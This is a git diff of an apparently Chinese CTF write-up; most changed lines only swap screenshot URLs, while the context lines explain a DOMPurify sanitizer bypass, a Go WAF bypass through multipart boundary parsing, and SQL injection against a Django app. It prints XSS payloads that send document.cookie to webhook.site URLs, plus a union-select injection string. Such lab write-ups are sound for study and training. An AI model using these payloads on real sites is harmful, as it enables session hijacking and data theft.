@@ -57,9 +57,9 @@ app.post(&#39;/api/layout&#39;, (req, res) =&gt; {
 
 可以看到在 content 的实现中是先检测再替换，也就是说我们可以将 payload 分为两段，一段写入 layout ，并将会被过滤的部分替换为 {{content}}，第二段写入 content，值就为会被过滤的部分，这样的话 content 和 layout 都可以绕过 `DOMPurify.sanitize()` 的检测，而且也会将 content 的值拼入 layout 中，形成最后的恶意 payload。而之所以 content 的值不会被过滤，应该是没有形成一个完整的 html ，没被检测到，可以在官方的github 上找到个 demo 来测试一下：[DOMPurify 3.2.4 &#34;Shipwreck&#34;](https://cure53.de/purify)
 
-![image-20250308193105525](https://bu.dusays.com/2025/03/11/67d0451dab4cc.png)
+![image-20250308193105525](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174930887.png)
 
-![image-20250308193135429](https://bu.dusays.com/2025/03/11/67d0451da9380.png)
+![image-20250308193135429](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174930886.png)
 
 可以看到第二次就被过滤了而第一次却没有被过滤，弹个窗先
 
@@ -77,11 +77,11 @@ content 为
 
 create post 就弹窗了
 
-![image-20250308193538228](https://bu.dusays.com/2025/03/11/67d0451dcbfb2.png)
+![image-20250308193538228](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174930904.png)
 
 源码也可以看到是成功插入了的
 
-![image-20250308193839895](https://bu.dusays.com/2025/03/11/67d0451db28e8.png)
+![image-20250308193839895](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174930910.png)
 
 带下 cookie
 
@@ -89,19 +89,19 @@ create post 就弹窗了
 &#34;a&#34; onloadstart=&#34;fetch(&#39;https://webhook.site/98df9897-f596-4e4b-9994-3ee26ff59249?f=&#39; &#43; document.cookie)&#34;
 ```
 
-![image-20250308194217163](https://bu.dusays.com/2025/03/11/67d0451de841a.png)
+![image-20250308194217163](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174931314.png)
 
 后面两道加强题都可以参考：https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists
 
-### safe layout*
+### safe layout
 
 加强了过滤
 
-![image-20250309201717396](https://bu.dusays.com/2025/03/11/67d0451dcd13f.png)
+![image-20250309201717396](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174931354.png)
 
 将 `ALLOWED_ATTR` 置为空，也就是不能引用属性，但跟进后会发现还可以用 `ALLOW_DATA_ATTR` 和 `ALLOW_ARIA_ATTR`
 
-![image-20250311133736480](https://bu.dusays.com/2025/03/11/67d0451dea2b2.png)
+![image-20250311133736480](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174931381.png)
 
 也就是说我们依然可以用自定义的 data，后接恶意代码即可
 
@@ -119,9 +119,9 @@ a&#34; src=&#34;a&#34; onloadstart=&#34;fetch(&#39;https://webhook.site/0f676d3e
 
 必须有 src 属性，不然会报错
 
-![image-20250311193529235](https://bu.dusays.com/2025/03/11/67d0451ee3b22.png)
+![image-20250311193529235](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174931411.png)
 
-### safe layout revenge*
+### safe layout revenge
 
 这道就修复了上面的非预期，把 `ALLOW_ARIA_ATTR` 和 `ALLOW_DATA_ATTR` 都设为了 false
 
@@ -152,7 +152,7 @@ manage.py 加个参数启动服务器，方便调试
 
 在 `supersqli\web_deploy\src\blog\views.py` 文件中的 flag 函数中我们可以发现存在 sql 注入
 
-![image-20250310174204987](https://bu.dusays.com/2025/03/11/67d0451f60557.png)
+![image-20250310174204987](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174931614.png)
 
 但是 `supersqli\web_deploy\simplewaf\main.go` 中的 waf 限制的很死
 
@@ -166,13 +166,13 @@ var hotfixPattern = regexp.MustCompile(`(?i)(select)`)
 
 注意到在 go 中加了个判断，判断 `mediaType` 是否为 `multipart/form-data`
 
-![image-20250310210644382](https://bu.dusays.com/2025/03/11/67d0451f41c4d.png)
+![image-20250310210644382](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174931705.png)
 
 找到一篇有关利用 `multipart/form-data` 解析差异实现绕过的文章：https://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/
 
 但文章中用的是 flask 框架，貌似在这里的 Django 中行不通，看下 Django 框架中对 `multipart/form-data` 处理，跟进到 multipartparser.py 中可以发现 Django 是通过请求头中的 `Content-Disposition` 字段来区分每个字段
 
-![image-20250310211645892](https://bu.dusays.com/2025/03/11/67d0451f0d968.png)
+![image-20250310211645892](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174931713.png)
 
 而在 go 中的 request.go 的 multipartReader 函数中
 
@@ -260,7 +260,9 @@ print(res)
 1&#39; union select 1,2,replace(replace(&#39;1&#34; union select 1,2,replace(replace(&#34;.&#34;,char(34),char(39)),char(46),&#34;.&#34;)--&#43;&#39;,char(34),char(39)),char(46),&#39;1&#34; union select 1,2,replace(replace(&#34;.&#34;,char(34),char(39)),char(46),&#34;.&#34;)--&#43;&#39;)--&#43;
 ```
 
-![image-20250310222255991](https://bu.dusays.com/2025/03/11/67d0451f2a13e.png)
+![image-20250310222255991](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174931998.png)
+
+
 
 
 
